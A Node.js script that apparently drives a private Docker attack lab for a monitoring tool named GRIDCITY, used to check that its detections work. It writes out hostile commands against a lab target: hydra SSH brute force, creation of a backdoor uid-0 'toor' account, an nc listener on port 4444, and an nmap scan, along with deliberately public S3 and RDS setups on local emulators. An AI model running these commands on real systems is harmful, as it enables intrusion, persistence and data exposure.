// GRIDCITY attack lab (compose.security-lab.yaml): starts a target SSH server
// with CrowdSec and Fail2ban plus two attackers on a private Docker network,
// runs real attacks against that target only, and creates exposures on the
// local AWS emulators. Used to prove that attacks show up in the city.
//
//   node scripts/security-lab.mjs up        build and start; print the host entry for GRIDCITY
//   node scripts/security-lab.mjs attack    every attack phase below, one after another
//   node scripts/security-lab.mjs attack brute|guess|backdoor|port|scan
//   node scripts/security-lab.mjs exposure  public bucket on LocalStack, public RDS on Moto
//   node scripts/security-lab.mjs down      remove the lab (containers, network, image cache stays)
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');
const keyDir = join(root, 'scripts/security-lab/.keys');
const keyFile = join(keyDir, 'gridcity_lab');
const TARGET = '172.31.250.10';
const compose = ['compose', '-f', 'compose.security-lab.yaml'];

function run(command, args, { input, quiet = false, allowFail = false } = {}) {
  const result = spawnSync(command, args, {
    cwd: root,
    input,
    encoding: 'utf8',
    stdio: [input === undefined ? 'inherit' : 'pipe', quiet ? 'pipe' : 'inherit', 'pipe'],
  });
  if (result.status !== 0 && !allowFail) {
    throw new Error(`${command} ${args.join(' ')} failed (${result.status}): ${result.stderr}`);
  }
  return result;
}
const docker = (args, options) => run('docker', args, options);
const inLab = (service, script, options) =>
  docker([...compose, 'exec', '-T', service, 'sh', '-c', script], options);
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function up() {
  if (!existsSync(keyFile)) {
    mkdirSync(keyDir, { recursive: true });
    run('ssh-keygen', [
      '-q',
      '-t',
      'ed25519',
      '-N',
      '',
      '-C',
      'gridcity-security-lab',
      '-f',
      keyFile,
    ]);
  }
  const tlsDir = join(keyDir, 'tls');
  if (!existsSync(join(tlsDir, 'cert.pem'))) {
    mkdirSync(tlsDir, { recursive: true });
    // A certificate that expires in 5 days, for the expiry checks.
    run(
      'openssl',
      [
        'req',
        '-x509',
        '-newkey',
        'rsa:2048',
        '-nodes',
        '-days',
        '5',
        '-subj',
        '/CN=localhost/O=GRIDCITY lab',
        '-keyout',
        join(tlsDir, 'key.pem'),
        '-out',
        join(tlsDir, 'cert.pem'),
      ],
      { quiet: true },
    );
  }
  docker([...compose, 'up', '-d', '--build']);
  for (let attempt = 0; attempt < 60; attempt++) {
    const scan = run('ssh-keyscan', ['-p', '2222', '-t', 'ed25519', '127.0.0.1'], {
      quiet: true,
      allowFail: true,
    });
    if (scan.stdout.trim()) {
      console.log('\nThe lab target is up. Add it to GRIDCITY:');
      console.log(
        `  hosts.yaml:   { id: lab-target, name: lab-target, address: 127.0.0.1, port: 2222, user: ops,`,
      );
      console.log(
        `                  auth: { method: keyFile, path: ${keyFile.replace(/\\/g, '/')} }, district: Security lab }`,
      );
      console.log(`  known_hosts:  ${scan.stdout.trim().split('\n').pop()}`);
      return;
    }
    await sleep(1000);
  }
  throw new Error('the lab target did not open SSH within a minute');
}

const PHASES = {
  /** Password guessing for root from the first attacker: 30 tries, all fail. */
  brute() {
    console.log('▶ brute force: 30 passwords for root from 172.31.250.20');
    inLab(
      'attacker',
      `for p in $(seq 1 30); do echo "guess$p"; done > /tmp/words && hydra -l root -P /tmp/words -t 4 -I ssh://${TARGET} || true`,
    );
  },
  /** A guessed password: 5 wrong tries for "test", then the right one, from the second attacker. */
  guess() {
    console.log(
      '▶ guessed password: 5 failures then a successful login as "test" from 172.31.250.21',
    );
    inLab(
      'attacker2',
      `printf 'letmein\\n123456\\nqwerty\\nadmin\\ntest\\npassword123\\n' > /tmp/words && hydra -l test -P /tmp/words -t 1 -I -f ssh://${TARGET} || true`,
    );
  },
  /** What an intruder leaves behind: a new account and a second root account (uid 0). */
  backdoor() {
    console.log('▶ backdoor accounts: "support" and a uid-0 "toor"');
    inLab('target', 'id support >/dev/null 2>&1 || useradd -m -s /bin/bash support');
    inLab('target', 'id toor >/dev/null 2>&1 || useradd -o -u 0 -g 0 -M -s /bin/bash toor');
  },
  /** A listener on a new port, like a reverse shell or a forgotten test service. */
  port() {
    console.log('▶ new open port 4444 (nc -lk)');
    docker([...compose, 'exec', '-d', 'target', 'sh', '-c', 'nc -lk -p 4444']);
  },
  /** A TCP port scan. Not detected without firewall logs: the lab shows that honestly. */
  scan() {
    console.log('▶ port scan of the first 1000 ports');
    inLab('attacker', `nmap -sT -T4 -p 1-1000 ${TARGET} | tail -n 5`);
  },
};

async function attack(names) {
  for (const name of names.length ? names : Object.keys(PHASES)) {
    const phase = PHASES[name];
    if (!phase) throw new Error(`unknown phase "${name}" (${Object.keys(PHASES).join(', ')})`);
    phase();
  }
  console.log('\nDone. GRIDCITY sweeps every minute (Security → Check now to see it at once).');
}

/** Exposures on the local AWS emulators already used for the connector tests. */
async function exposure() {
  const { S3Client, CreateBucketCommand, PutBucketPolicyCommand, DeletePublicAccessBlockCommand } =
    await import('@aws-sdk/client-s3');
  const { RDSClient, CreateDBInstanceCommand } = await import('@aws-sdk/client-rds');
  const { EC2Client, CreateSecurityGroupCommand, AuthorizeSecurityGroupIngressCommand } =
    await import('@aws-sdk/client-ec2');
  const credentials = { accessKeyId: 'test', secretAccessKey: 'test' };

  const s3 = new S3Client({
    region: 'us-east-1',
    endpoint: 'http://127.0.0.1:4566',
    forcePathStyle: true,
    credentials,
  });
  const bucket = 'public-website';
  await s3.send(new CreateBucketCommand({ Bucket: bucket })).catch(() => undefined);
  // A previous run's one-click fix ("Block public access") would hide the exposure: undo it.
  await s3.send(new DeletePublicAccessBlockCommand({ Bucket: bucket })).catch(() => undefined);
  await s3.send(
    new PutBucketPolicyCommand({
      Bucket: bucket,
      Policy: JSON.stringify({
        Version: '2012-10-17',
        Statement: [
          {
            Effect: 'Allow',
            Principal: '*',
            Action: 's3:GetObject',
            Resource: `arn:aws:s3:::${bucket}/*`,
          },
        ],
      }),
    }),
  );
  console.log(`▶ LocalStack: bucket "${bucket}" readable by everyone`);

  const moto = { region: 'us-east-1', endpoint: 'http://127.0.0.1:5000', credentials };
  const ec2 = new EC2Client(moto);
  const group = await ec2.send(
    new CreateSecurityGroupCommand({
      GroupName: `db-open-${Date.now()}`,
      Description: 'lab: open to the world',
    }),
  );
  await ec2.send(
    new AuthorizeSecurityGroupIngressCommand({
      GroupId: group.GroupId,
      IpPermissions: [
        { IpProtocol: 'tcp', FromPort: 5432, ToPort: 5432, IpRanges: [{ CidrIp: '0.0.0.0/0' }] },
      ],
    }),
  );
  const rds = new RDSClient(moto);
  await rds
    .send(
      new CreateDBInstanceCommand({
        DBInstanceIdentifier: 'exposed-db',
        Engine: 'postgres',
        DBInstanceClass: 'db.t3.micro',
        AllocatedStorage: 20,
        MasterUsername: 'admin',
        MasterUserPassword: 'lab-only-password',
        PubliclyAccessible: true,
        VpcSecurityGroupIds: [group.GroupId],
      }),
    )
    .catch((error) => {
      if (!/AlreadyExists/.test(String(error?.name))) throw error;
    });
  console.log(
    `▶ Moto: RDS "exposed-db", publicly accessible, ${group.GroupId} open on 5432 to 0.0.0.0/0`,
  );
}

function down() {
  docker([...compose, 'down', '-v', '--remove-orphans']);
}

const [command = 'up', ...rest] = process.argv.slice(2);
try {
  if (command === 'up') await up();
  else if (command === 'attack') await attack(rest);
  else if (command === 'exposure') await exposure();
  else if (command === 'down') down();
  else throw new Error(`unknown command "${command}"`);
} catch (error) {
  console.error(String(error instanceof Error ? error.message : error));
  process.exit(1);
}
// The key file is read here only to tell the user it exists.
if (command === 'up' && existsSync(`${keyFile}.pub`))
  console.log(`  key:          ${readFileSync(`${keyFile}.pub`, 'utf8').trim().slice(0, 40)}…`);
